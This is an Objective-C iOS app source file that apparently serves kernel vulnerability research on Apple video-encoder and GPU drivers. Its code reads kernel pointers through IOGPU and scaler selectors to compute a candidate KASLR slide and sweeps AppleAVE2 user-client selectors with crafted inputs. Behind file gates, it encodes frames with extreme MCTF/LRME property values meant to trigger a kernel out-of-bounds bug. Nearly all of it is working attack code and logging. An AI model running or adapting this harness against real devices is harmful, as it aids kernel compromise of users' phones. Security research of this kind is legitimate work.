// AVEMCTFProbe — live-property probe for the AppleAVE2 MCTF/LRME sibling family.
// Safe by default: only sets/reads properties. The encode stage (which can trip a
// kernel OOB on a vulnerable build) is gated behind Documents/run_encode.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <IOKit/IOKitLib.h>
#import <sys/utsname.h>
#import <string.h>
#import <unistd.h>
#import <pthread.h>

static NSString *gLogPath;
static NSMutableString *gLog;
static pthread_mutex_t gLock = PTHREAD_MUTEX_INITIALIZER;
static volatile int gStop = 0;
static NSString *gHWEncoderID = nil;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    pthread_mutex_lock(&gLock);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    pthread_mutex_unlock(&gLock);
    NSLog(@"[avemctf] %@", s);
}

static NSString *kr(OSStatus s) { return [NSString stringWithFormat:@"%d", (int)s]; }

static NSString *readBack(VTCompressionSessionRef s, CFStringRef key) {
    CFTypeRef out = NULL;
    OSStatus st = VTSessionCopyProperty(s, key, kCFAllocatorDefault, &out);
    if (st != 0 || !out) return [NSString stringWithFormat:@"err=%d", (int)st];
    NSString *r = [NSString stringWithFormat:@"%@", (__bridge id)out];
    CFRelease(out);
    return r;
}

static void setKey(VTCompressionSessionRef s, const char *key, int v) {
    CFStringRef k = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    int32_t n = v;
    CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &n);
    OSStatus st = VTSessionSetProperty(s, k, num);
    L(@"  set %-24s = %d -> %@  readback=%@", key, v, kr(st), readBack(s, k));
    CFRelease(num); CFRelease(k);
}

static void dumpEncoders(void) {
    CFArrayRef list = NULL;
    OSStatus st = VTCopyVideoEncoderList(NULL, &list);
    L(@"VTCopyVideoEncoderList -> %@ count=%ld", kr(st), list ? (long)CFArrayGetCount(list) : -1);
    if (!list) return;
    NSArray *arr = (__bridge NSArray *)list;
    for (NSDictionary *d in arr) {
        NSNumber *codec = d[(__bridge NSString *)kVTVideoEncoderList_CodecType];
        if (!codec || codec.unsignedIntValue != kCMVideoCodecType_HEVC) continue;
        BOOL hw = [d[(__bridge NSString *)kVTVideoEncoderList_IsHardwareAccelerated] boolValue];
        L(@"  HEVC enc id=%@ name=%@ hw=%d perf=%@",
          d[(__bridge NSString *)kVTVideoEncoderList_EncoderID],
          d[(__bridge NSString *)kVTVideoEncoderList_EncoderName], hw,
          d[(__bridge NSString *)kVTVideoEncoderList_PerformanceRating]);
        if (hw && !gHWEncoderID) gHWEncoderID = [d[(__bridge NSString *)kVTVideoEncoderList_EncoderID] copy];
    }
    CFRelease(list);
    CFStringRef encID = NULL;
    CFDictionaryRef supported = NULL;
    CFMutableDictionaryRef spec = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (gHWEncoderID) CFDictionarySetValue(spec, kVTVideoEncoderSpecification_EncoderID,
                                           (__bridge CFStringRef)gHWEncoderID);
    OSStatus s2 = VTCopySupportedPropertyDictionaryForEncoder(1280, 720, kCMVideoCodecType_HEVC,
                                                              spec, &encID, &supported);
    L(@"supported props (hwID=%@) -> %@ encID=%@ count=%ld", gHWEncoderID, kr(s2),
      (__bridge NSString *)encID, supported ? (long)CFDictionaryGetCount(supported) : -1);
    if (supported) {
        NSArray *keys = [(__bridge NSDictionary *)supported allKeys];
        NSArray *sorted = [keys sortedArrayUsingSelector:@selector(compare:)];
        NSUInteger n = MIN(sorted.count, (NSUInteger)40);
        for (NSUInteger i = 0; i < n; i++) L(@"    key: %@", sorted[i]);
        CFRelease(supported);
    }
    if (encID) CFRelease(encID);
    CFRelease(spec);
}

static VTCompressionSessionRef makeSession(const char *codecName) {
    CMVideoCodecType codec = kCMVideoCodecType_HEVC;
    if (codecName && strcmp(codecName, "avc") == 0) codec = kCMVideoCodecType_H264;
    VTCompressionSessionRef s = NULL;
    CFMutableDictionaryRef spec = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (gHWEncoderID) CFDictionarySetValue(spec, kVTVideoEncoderSpecification_EncoderID,
                                           (__bridge CFStringRef)gHWEncoderID);
    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, codec,
                                             spec, NULL, NULL, NULL, NULL, &s);
    CFRelease(spec);
    L(@"VTCompressionSessionCreate(%s, hwID=%@) -> %@ session=%p",
      codecName ? codecName : "hevc", gHWEncoderID, kr(st), s);
    return s;
}

static void setArrayKey(VTCompressionSessionRef s, const char *key, const int *vals, int n) {
    CFStringRef k = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    CFMutableArrayRef a = CFArrayCreateMutable(kCFAllocatorDefault, n, &kCFTypeArrayCallBacks);
    for (int i = 0; i < n; i++) {
        int32_t v = vals[i];
        CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
        CFArrayAppendValue(a, num);
        CFRelease(num);
    }
    OSStatus st = VTSessionSetProperty(s, k, a);
    L(@"  set %-24s = array[%d] -> %@", key, n, kr(st));
    CFRelease(a); CFRelease(k);
}

static void sessionSetup(VTCompressionSessionRef s) {
    setKey(s, "EncoderUsage", 1);
    setKey(s, "RCMode", 20);
    setKey(s, "EnableMCTF", 1);
    CFStringRef k;
    k = kVTCompressionPropertyKey_RealTime;
    VTSessionSetProperty(s, k, kCFBooleanFalse);
    k = kVTCompressionPropertyKey_AllowFrameReordering;
    VTSessionSetProperty(s, k, kCFBooleanTrue);
    k = kVTCompressionPropertyKey_AllowTemporalCompression;
    VTSessionSetProperty(s, k, kCFBooleanTrue);
    CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){30});
    VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, num);
    CFRelease(num);
    num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){15});
    CFStringRef blr = CFSTR("BaseLayerFrameRate");
    VTSessionSetProperty(s, blr, num);
    CFRelease(num);
}

static void encodeFrames(VTCompressionSessionRef s, int frames) {
    NSDictionary *attrs = @{ (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{} };
    CVPixelBufferRef pb = NULL;
    CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                      kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                      (__bridge CFDictionaryRef)attrs, &pb);
    L(@"  CVPixelBufferCreate -> %d pb=%p", (int)cv, pb);
    if (!pb) return;
    CVPixelBufferLockBaseAddress(pb, 0);
    for (size_t p = 0; p < CVPixelBufferGetPlaneCount(pb); p++) {
        void *base = CVPixelBufferGetBaseAddressOfPlane(pb, p);
        size_t h = CVPixelBufferGetHeightOfPlane(pb, p);
        size_t bpr = CVPixelBufferGetBytesPerRowOfPlane(pb, p);
        if (base) memset(base, 0x80, h * bpr);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
    for (int i = 0; i < frames && !gStop; i++) {
        CMTime pts = CMTimeMake(i, 30);
        OSStatus est = VTCompressionSessionEncodeFrame(s, pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
        L(@"  encode[%d] -> %@", i, kr(est));
        if (est != 0) break;
    }
    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    CVPixelBufferRelease(pb);
}

static void stage_iogpu(void) {
    L(@"=== IOGPU KASLR probe (safe) ===");
    io_service_t dev = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPUDevice"));
    if (!dev) { L(@"IOGPUDevice absent"); return; }
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(dev, mach_task_self(), 0, &c);
    L(@"IOGPUDevice open type0 -> 0x%x conn=0x%x", kr, c);
    if (kr == KERN_SUCCESS) {
        uint8_t out[0x40] = {0};
        size_t osz = sizeof(out);
        kr = IOConnectCallMethod(c, 1, NULL, 0, NULL, 0, NULL, NULL, out, &osz);
        L(@"IOGPU sel1 -> 0x%x osz=0x%zx", kr, osz);
        if (kr == KERN_SUCCESS && osz >= 0x10) {
            uint64_t q0 = 0, q1 = 0, q2 = 0, q3 = 0;
            memcpy(&q0, out, 8); memcpy(&q1, out+8, 8);
            memcpy(&q2, out+0x10, 8); memcpy(&q3, out+0x18, 8);
            L(@"sel1 q0=0x%016llx q1=0x%016llx q2=0x%016llx q3=0x%016llx",
              (unsigned long long)q0, (unsigned long long)q1,
              (unsigned long long)q2, (unsigned long long)q3);
            uint32_t low = (uint32_t)q0;
            uint32_t slide = low - 0x07c67f18u;
            L(@"candidate slide=0x%x kernel_text=0x%llx", slide,
              0xfffffff007004000ULL + (uint64_t)slide);
        }
        IOServiceClose(c);
    }
    IOObjectRelease(dev);
    io_service_t surf = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (surf) {
        io_connect_t sc = 0;
        kern_return_t skr = IOServiceOpen(surf, mach_task_self(), 0, &sc);
        L(@"IOSurfaceRoot open type0 -> 0x%x conn=0x%x", skr, sc);
        if (skr == KERN_SUCCESS) IOServiceClose(sc);
        IOObjectRelease(surf);
    } else {
        L(@"IOSurfaceRoot absent");
    }
}

static void stage_ave2_open(void) {
    L(@"=== AppleAVE2 direct user-client probe (safe, open only) ===");
    const char *names[] = {"AppleAVE2Driver", "AppleAVE2Interface", "AppleAVE2"};
    for (size_t i = 0; i < sizeof(names)/sizeof(names[0]); i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(names[i]));
        if (!svc) { L(@"AVE2 service %s: absent", names[i]); continue; }
        for (uint32_t type = 0; type < 8; type++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
            L(@"AVE2 %s open type=%u -> 0x%x conn=0x%x", names[i], type, kr, c);
            if (kr == KERN_SUCCESS) IOServiceClose(c);
        }
        IOObjectRelease(svc);
    }
}

static void stage_ave2_sweep(NSString *docs) {
    NSString *gate = [docs stringByAppendingPathComponent:@"run_ave2"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:gate]) {
        L(@"[AVE2SWEEP] %@ absent; skipped", gate);
        return;
    }
    L(@"=== AppleAVE2 direct sweep (GATED) ===");
    const char *names[] = {"AppleAVE2Driver", "AppleAVE2Interface"};
    const size_t sizes[] = {0, 8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x58,
                            0x100, 0x168, 0x200, 0x400, 0x800, 0x920, 0x1000,
                            0x2000, 0x4000, 0x10000, 0x1a0a0, 0x1a0b0};
    for (size_t ni = 0; ni < sizeof(names)/sizeof(names[0]); ni++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(names[ni]));
        if (!svc) { L(@"[AVE2SWEEP] %s absent", names[ni]); continue; }
        for (uint32_t type = 1; type <= 5; type++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
            if (kr != KERN_SUCCESS) continue;
            L(@"[AVE2SWEEP] OPEN %s type=%u conn=0x%x", names[ni], type, c);
            for (uint32_t sel = 1; sel <= 10; sel++) {
                for (size_t si = 0; si < sizeof(sizes)/sizeof(sizes[0]); si++) {
                    size_t sz = sizes[si];
                    void *in = sz ? calloc(1, sz) : NULL;
                    uint8_t out[0x2000];
                    memset(out, 0, sizeof(out));
                    size_t osz = sizeof(out);
                    L(@"[AVE2SWEEP] call sel=%u size=0x%zx", sel, sz);
                    kr = IOConnectCallStructMethod(c, sel, in, sz, out, &osz);
                    if (kr != 0xe00002c2 && kr != 0xe00002c4 && kr != 0xe00002bc) {
                        L(@"[AVE2SWEEP] HIT sel=%u size=0x%zx -> 0x%x osz=0x%zx out0=0x%llx",
                          sel, sz, kr, osz, (unsigned long long)*(uint64_t *)out);
                    }
                    free(in);
                }
                // scalar-only variant
                uint64_t sout[4] = {0}; uint32_t soutCnt = 4;
                kern_return_t skr = IOConnectCallScalarMethod(c, sel, NULL, 0, sout, &soutCnt);
                if (skr != 0xe00002c2 && skr != 0xe00002c4 && skr != 0xe00002bc)
                    L(@"[AVE2SWEEP] SCALAR HIT sel=%u -> 0x%x cnt=%u out0=0x%llx", sel, skr, soutCnt,
                      (unsigned long long)sout[0]);
            }
            // Crafted create attempt (macOS wire-format shape; version is the
            // iOS kext version, 913.64.1). Safe fields only.
            {
                size_t sz = 0x920;
                uint8_t *in = calloc(1, sz);
                strncpy((char *)in + 0x28, "913.64.1", 15);
                *(int32_t *)(in + 0x910) = 1;
                *(int32_t *)(in + 0x914) = 1;
                *(int32_t *)(in + 0x918) = 1;
                *(uint64_t *)(in + 0x808) = 0xffffffffffffffffULL;
                uint8_t out[0x2000]; memset(out, 0, sizeof(out));
                size_t osz = sizeof(out);
                L(@"[AVE2SWEEP] crafted create sel=1 size=0x%zx", sz);
                kern_return_t ckr = IOConnectCallStructMethod(c, 1, in, sz, out, &osz);
                L(@"[AVE2SWEEP] crafted create -> 0x%x osz=0x%zx out0=0x%llx out8=0x%llx out10=0x%llx",
                  ckr, osz, (unsigned long long)*(uint64_t *)out,
                  (unsigned long long)*(uint64_t *)(out + 8),
                  (unsigned long long)*(uint64_t *)(out + 0x10));
                free(in);
            }
            IOServiceClose(c);
            break;
        }
        IOObjectRelease(svc);
    }
    L(@"=== AppleAVE2 direct sweep done ===");
}

static void stage_agx(void) {
    L(@"=== AGX / IOGPU probe (safe) ===");
    const char *names[] = {"AGXAcceleratorG14P", "AGXAccelerator", "IOGPU", "IOAccelerator"};
    for (size_t i = 0; i < sizeof(names)/sizeof(names[0]); i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(names[i]));
        if (!svc) { L(@"AGX %s absent", names[i]); continue; }
        char cls[256] = {0}; IOObjectGetClass(svc, cls);
        L(@"AGX %s class=%s", names[i], cls);
        for (uint32_t type = 0; type < 4; type++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
            L(@"AGX %s open type=%u -> 0x%x conn=0x%x", names[i], type, kr, c);
            if (kr == KERN_SUCCESS) {
                uint8_t out[0x218]; memset(out, 0, sizeof(out)); size_t osz = sizeof(out);
                kr = IOConnectCallMethod(c, 1, NULL, 0, NULL, 0, NULL, NULL, out, &osz);
                L(@"AGX %s sel1 -> 0x%x osz=0x%zx q0=0x%llx q1=0x%llx", names[i], kr, osz,
                  (unsigned long long)*(uint64_t *)out, (unsigned long long)*(uint64_t *)(out+8));
                IOServiceClose(c);
            }
        }
        io_registry_entry_t parent = 0;
        if (IORegistryEntryGetParentEntry(svc, kIOServicePlane, &parent) == KERN_SUCCESS) {
            char pcls[256] = {0}; IOObjectGetClass(parent, pcls);
            L(@"AGX %s parent class=%s", names[i], pcls);
            for (uint32_t type = 0; type < 4; type++) {
                io_connect_t c = 0;
                kern_return_t kr = IOServiceOpen((io_service_t)parent, mach_task_self(), type, &c);
                L(@"AGX parent %s open type=%u -> 0x%x conn=0x%x", pcls, type, kr, c);
                if (kr == KERN_SUCCESS) {
                    uint8_t out[0x218]; memset(out, 0, sizeof(out)); size_t osz = sizeof(out);
                    kr = IOConnectCallMethod(c, 1, NULL, 0, NULL, 0, NULL, NULL, out, &osz);
                    L(@"AGX parent sel1 -> 0x%x osz=0x%zx q0=0x%llx q1=0x%llx", kr, osz,
                      (unsigned long long)*(uint64_t *)out, (unsigned long long)*(uint64_t *)(out+8));
                    IOServiceClose(c);
                }
            }
            IOObjectRelease(parent);
        }
        IOObjectRelease(svc);
    }
}

static void stage_scaler_open(void) {
    L(@"=== M2Scaler user-client probe (safe, open only) ===");
    const char *names[] = {"AppleM2ScalerCSCDriver", "IOSurfaceAccelerator"};
    for (size_t i = 0; i < sizeof(names)/sizeof(names[0]); i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(names[i]));
        if (!svc) { L(@"scaler service %s: absent", names[i]); continue; }
        for (uint32_t type = 0; type < 4; type++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
            L(@"scaler %s open type=%u -> 0x%x conn=0x%x", names[i], type, kr, c);
            if (kr == KERN_SUCCESS) IOServiceClose(c);
        }
        IOObjectRelease(svc);
    }
}

static void stage_scaler_dump(NSString *docs) {
    NSString *gate = [docs stringByAppendingPathComponent:@"run_scaler"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:gate]) {
        L(@"[SCALER] %@ absent; skipped", gate);
        return;
    }
    L(@"=== M2Scaler selector dump (GATED) ===");
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
    if (!svc) { L(@"[SCALER] service absent"); return; }
    io_connect_t c = 0;
    for (uint32_t type = 0; type < 4; type++) {
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
        L(@"[SCALER] open type=%u -> 0x%x conn=0x%x", type, kr, c);
        if (kr == KERN_SUCCESS) break;
    }
    IOObjectRelease(svc);
    if (!c) { L(@"[SCALER] no connection"); return; }

    // sel11: provider state dump (kernel -> user copy).
    for (int variant = 0; variant < 2; variant++) {
        uint8_t out[0x400];
        memset(out, 0, sizeof(out));
        size_t osz = 0x298;
        kern_return_t kr;
        if (variant == 0)
            kr = IOConnectCallMethod(c, 11, NULL, 0, NULL, 0, NULL, NULL, out, &osz);
        else
            kr = IOConnectCallStructMethod(c, 11, NULL, 0, out, &osz);
        L(@"[SCALER] sel11 variant=%d -> 0x%x osz=0x%zx", variant, kr, osz);
        if (kr == 0) {
            for (size_t i = 0; i + 8 <= 0x298 && i < osz; i += 8) {
                uint64_t q = 0; memcpy(&q, out + i, 8);
                if (q >= 0xfffffff000000000ULL || q >= 0xfffffe0000000000ULL)
                    L(@"[SCALER] q[0x%03zx]=0x%016llx", i, (unsigned long long)q);
            }
            L(@"[SCALER] hexdump: %@", [NSData dataWithBytes:out length:MIN(osz,(size_t)0x298)]);
        }
    }

    // sel6: notification/config path with the minimum accepted shape.
    {
        size_t sz = 0xfa8;
        uint8_t *in = calloc(1, sz);
        *(uint32_t *)in = 1;          // <= 0x3e8 gate
        in[0xfa4] = 1;                // user bit
        uint8_t out[0x400]; memset(out, 0, sizeof(out));
        size_t osz = sizeof(out);
        kern_return_t kr = IOConnectCallStructMethod(c, 6, in, sz, out, &osz);
        L(@"[SCALER] sel6 crafted -> 0x%x osz=0x%zx", kr, osz);
        free(in);
    }
    IOServiceClose(c);
    L(@"=== M2Scaler selector dump done ===");
}

static void runPropsOnly(void) {
    L(@"=== props-only pass (no encode) ===");
    const char *keys[] = {"LRMERSPassNum","MCTFEdgeCount","MCTFEdgeThresh","MCTFMaxNextRefNum","MCTFRampUpFrameNum"};
    const int vals[] = {1, 0x10, 0x100, 0x1000, 0x10000, 0x100000, 0x40000000, 0x7fffffff};
    for (size_t i = 0; i < sizeof(keys)/sizeof(keys[0]); i++) {
        for (size_t j = 0; j < sizeof(vals)/sizeof(vals[0]); j++) {
            if (gStop) return;
            L(@"-- props key=%s val=%d", keys[i], vals[j]);
            VTCompressionSessionRef s = makeSession("hevc");
            if (!s) continue;
            sessionSetup(s);
            setKey(s, keys[i], vals[j]);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }
    }
    L(@"=== props-only pass done ===");
}

static void runEncodeLadder(void) {
    L(@"=== ENCODE pass (gate present) ===");
    // Sanity: the known CVE-2026-112705 key must be rejected on 27.2.
    {
        VTCompressionSessionRef s = makeSession("hevc");
        if (s) {
            setKey(s, "NumberOfTemporalLayers", 16463);
            encodeFrames(s, 1);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }
    }
    const char *keys[] = {"LRMERSPassNum","MCTFEdgeCount","MCTFEdgeThresh","MCTFMaxNextRefNum","MCTFRampUpFrameNum"};
    const int vals[] = {4, 64, 0x10, 0x100, 0x1000, 0x10000, 0x100000, 0x40000000, 0x7fffffff};
    for (size_t i = 0; i < sizeof(keys)/sizeof(keys[0]); i++) {
        for (size_t j = 0; j < sizeof(vals)/sizeof(vals[0]); j++) {
            if (gStop) return;
            L(@"== ENCODE key=%s val=%d", keys[i], vals[j]);
            VTCompressionSessionRef s = makeSession("hevc");
            if (!s) continue;
            sessionSetup(s);
            setKey(s, keys[i], vals[j]);
            encodeFrames(s, 4);
            L(@"== ENCODE key=%s val=%d survived", keys[i], vals[j]);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
            sleep(1);
        }
    }
    // Strength-level array (values are bounded <25 by the plugin; the kext
    // checks only the element count 0..2, not the values).
    if (!gStop) {
        L(@"== ENCODE MCTFStrengthLevel array [24,24]");
        VTCompressionSessionRef s = makeSession("hevc");
        if (s) {
            sessionSetup(s);
            int vals[2] = {24, 24};
            setArrayKey(s, "MCTFStrengthLevel", vals, 2);
            encodeFrames(s, 4);
            L(@"== ENCODE MCTFStrengthLevel survived");
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }
    }
    // Combined extreme values: all five at once.
    if (!gStop) {
        L(@"== ENCODE combined all five = 0x7fffffff");
        VTCompressionSessionRef s = makeSession("hevc");
        if (s) {
            sessionSetup(s);
            setKey(s, "LRMERSPassNum", 0x7fffffff);
            setKey(s, "MCTFEdgeCount", 0x7fffffff);
            setKey(s, "MCTFEdgeThresh", 0x7fffffff);
            setKey(s, "MCTFMaxNextRefNum", 0x7fffffff);
            setKey(s, "MCTFRampUpFrameNum", 0x7fffffff);
            encodeFrames(s, 4);
            L(@"== ENCODE combined survived");
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }
    }
    L(@"=== ENCODE pass done ===");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate
- (void)refresh {
    pthread_mutex_lock(&gLock);
    NSString *copy = [gLog copy];
    pthread_mutex_unlock(&gLock);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.tv.text = copy;
        if (copy.length) [self.tv scrollRangeToVisible:NSMakeRange(copy.length-1, 1)];
    });
}
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    gLog = [NSMutableString new];
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    [[NSFileManager defaultManager] createDirectoryAtPath:docs withIntermediateDirectories:YES attributes:nil error:nil];
    gLogPath = [docs stringByAppendingPathComponent:@"avemctf.log"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    self.tv = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.tv.editable = NO;
    self.tv.font = [UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];
    [vc.view addSubview:self.tv];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.7*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            @autoreleasepool {
                struct utsname u; uname(&u);
                L(@"=== AVEMCTFProbe start %s %s ===", u.machine, u.version);
                L(@"log: %@", gLogPath);
                stage_agx(); [self refresh];
                stage_iogpu(); [self refresh];
                stage_scaler_open(); [self refresh];
                stage_scaler_dump(docs); [self refresh];
                stage_ave2_open(); [self refresh];
                stage_ave2_sweep(docs); [self refresh];
                dumpEncoders(); [self refresh];
                runPropsOnly(); [self refresh];
                NSString *gate = [docs stringByAppendingPathComponent:@"run_encode"];
                if ([[NSFileManager defaultManager] fileExistsAtPath:gate]) {
                    runEncodeLadder(); [self refresh];
                } else {
                    L(@"[GATE] %@ absent; encode pass skipped", gate);
                }
                L(@"=== done ==="); [self refresh];
            }
        });
    });
    return YES;
}
@end

int main(int argc, char **argv) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
